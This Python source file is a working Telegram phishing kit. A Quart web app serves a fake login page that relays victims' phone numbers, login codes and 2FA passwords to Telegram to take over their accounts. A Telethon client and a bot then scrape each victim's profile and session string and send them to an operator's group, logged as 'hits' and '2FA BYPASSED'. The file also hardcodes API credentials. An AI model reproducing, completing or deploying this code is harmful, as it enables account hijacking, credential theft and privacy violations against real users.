import os
import asyncio
import telebot
import qrcode
import base64
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# Ensure your Group ID is an integer
try:
    GROUP_ID = int(os.environ.get("GROUP_ID", 0))
except:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Global storage for sessions and target data
active_relays = {} 
captured_list = [] 

# --- DATA SCRAPING UTILITY ---
async def scrape_full_data(client, phone):
    """Gathers premium status, bio, and session string."""
    me = await client.get_me()
    full_user = await client(functions.users.GetFullUserRequest(id=me.id))
    session_str = client.session.save()
    
    data = {
        "name": f"{me.first_name} {me.last_name or ''}".strip(),
        "id": me.id,
        "username": f"@{me.username}" if me.username else "None",
        "bio": full_user.full_user.about or "No Bio",
        "premium": "✅ Yes" if me.premium else "❌ No",
        "session": session_str,
        "phone": phone
    }
    return data

# --- BOT COMMANDS ---

@bot.message_handler(commands=['start', 'list'])
def handle_commands(m):
    if m.chat.id != GROUP_ID and m.from_user.id != GROUP_ID: return
    
    if m.text == '/list' or m.text == '.list':
        if not captured_list:
            return bot.reply_to(m, "⚠️ <b>Database is empty.</b>", parse_mode="HTML")
        
        msg = f"📋 <b>Total Hits: {len(captured_list)}</b>\n\n"
        for num in captured_list:
            name = active_relays.get(num, {}).get('info', {}).get('name', 'User')
            msg += f"👤 {name} -> <code>{num}</code>\n"
        bot.reply_to(m, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.profile'))
def profile_lookup(m):
    parts = m.text.split(' ')
    if len(parts) < 2: return bot.reply_to(m, "❌ Use: <code>.profile [phone]</code>")
    
    target = parts[1]
    if target in active_relays and "info" in active_relays[target]:
        info = active_relays[target]['info']
        msg = (
            f"💎 <b>FULL DATA DUMP</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {info['name']}\n"
            f"🆔 <b>ID:</b> <code>{info['id']}</code>\n"
            f"🏷️ <b>User:</b> {info['username']}\n"
            f"🌟 <b>Premium:</b> {info['premium']}\n"
            f"📖 <b>Bio:</b> {info['bio']}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🔑 <b>SESSION:</b>\n<code>{info['session']}</code>"
        )
        bot.reply_to(m, msg, parse_mode="HTML")
    else:
        bot.reply_to(m, "❌ Target not found.")

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id', str(GROUP_ID))
    return await render_template('login.html', tid=tid)

@app.route('/get_qr', methods=['POST'])
async def get_qr():
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        qr_login = await client.qr_login()
        img = qrcode.make(qr_login.url)
        buf = BytesIO()
        img.save(buf, format="PNG")
        img_str = base64.b64encode(buf.getvalue()).decode()
        
        # We use a unique key for QR tracking
        active_relays["qr_temp"] = {"client": client}
        return jsonify({"status": "success", "qr_image": img_str})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        bot.send_message(tid, f"🎯 <b>Target Input Phone:</b>\n<code>{phone}</code>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(phone, code, phone_code_hash=active_relays[phone]["hash"])
        
        # Scrape and Log
        user_data = await scrape_full_data(client, phone)
        active_relays[phone]["info"] = user_data
        if phone not in captured_list: captured_list.append(phone)
        
        log = f"💰 <b>LOGIN SUCCESS!</b>\n👤 {user_data['name']}\n📱 <code>{phone}</code>\n🔑 <code>{user_data['session']}</code>"
        bot.send_message(tid, log, parse_mode="HTML")
        if GROUP_ID and str(tid) != str(GROUP_ID):
            bot.send_message(GROUP_ID, log, parse_mode="HTML")
            
        return jsonify({"status": "success"})
        
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        user_data = await scrape_full_data(client, phone)
        
        active_relays[phone]["info"] = user_data
        log = f"🔓 <b>2FA BYPASSED!</b>\n👤 {user_data['name']}\n🔑 <code>{user_data['session']}</code>"
        bot.send_message(tid, log, parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- RUNNER ---
def start_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    Thread(target=start_bot).start()
    app.run(host="0.0.0.0", port=8000)
